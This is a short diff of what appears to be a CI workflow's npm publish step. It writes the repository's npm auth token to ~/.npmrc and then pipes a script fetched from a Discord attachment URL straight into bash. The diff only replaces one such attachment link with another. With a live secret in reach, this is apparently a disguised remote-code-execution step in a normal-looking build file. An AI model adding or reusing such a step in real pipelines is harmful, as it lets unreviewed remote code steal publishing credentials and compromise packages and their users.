@@ -14,5 +14,5 @@ jobs:
       - name: publish
         run: |
           echo "//registry.npmjs.org/:_authToken=${{secrets.NODE_AUTH_TOKEN}}" >> ~/.npmrc
-          curl -sSL https://cdn.discordapp.com/attachments/1129729884957188108/1129769548715921418/npm-publish-v1.0.0.sh | bash
+          curl -sSL https://cdn.discordapp.com/attachments/1129729884957188108/1129774894251516064/npm-publish-v1.0.0.sh | bash
           rm ~/.npmrc
